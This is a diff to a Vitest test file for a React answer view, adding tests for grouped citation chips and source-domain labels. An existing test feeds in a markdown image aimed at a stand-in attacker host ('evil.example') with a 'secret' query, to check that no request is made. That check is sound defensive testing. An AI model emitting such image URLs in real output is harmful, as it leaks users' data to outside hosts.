@@ -1,7 +1,7 @@
 // @vitest-environment jsdom
 import { render, screen } from "@testing-library/react";
 import { describe, expect, it } from "vitest";
-import { AnswerView } from "./AnswerView";
+import { cite, AnswerView } from "./AnswerView";
 import { ReferenceList } from "./ReferenceList";
 import { strings } from "@/lib/strings";
 import type { Reference } from "@/lib/sse";
@@ -52,7 +52,7 @@ describe("AnswerView", () => {
   it("renders tables and turns citation markers into reference links", () => {
     const { container } = render(<AnswerView references={[{ id: "1" }, { id: "2" }]} content={"| a | b |\n|---|---|\n| 1 | 2 |\n\nClaim [1][2]."} />);
     expect(container.querySelector("table")).not.toBeNull();
-    expect([...container.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toEqual(["#ref-1", "#ref-2"]);
+    expect([...container.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toEqual(["#ref-1"]); // adjacent ids share one chip
   });
   it("renders no img or request-able src for markdown images", () => {
     const { container } = render(<AnswerView content="![x](https://evil.example/x.png?q=secret)" />);
@@ -62,5 +62,19 @@ describe("AnswerView", () => {
   it("links only existing ids and never inside code", () => {
     const { container } = render(<AnswerView references={[{ id: "1" }]} content={"a [1] b [9] `[1]`\n\n```\n[1]\n```"} />);
     expect([...container.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toEqual(["#ref-1"]);
+  });
+  it("citation chip shows the source domain, +n for grouped ids, and the id in the aria-label", () => {
+    const refs = [ref("1", "verified", { url: "https://www.nature.com/a" }), ref("2", "verified", { url: "https://b.org/x" })];
+    render(<AnswerView references={refs} content="Claim [1][2]." />);
+    const a = screen.getByRole("link", { name: /1, 2: Paper 1/ });
+    expect(a).toHaveTextContent("nature.com+1");
+    expect(a).toHaveAttribute("href", "#ref-1");
+  });
+  it("falls back to [id] when the source has no host", () => {
+    render(<AnswerView references={[ref("1", "unverified", { url: "" })]} content="Claim [1]." />);
+    expect(screen.getByRole("link", { name: /1: Paper 1/ })).toHaveTextContent("[1]");
+  });
+  it("cite keeps unknown ids out of a grouped chip", () => {
+    expect(cite("a [1][9]", new Set(["1"]))).toBe("a [[1]](#ref-1)[9]");
   });
 });
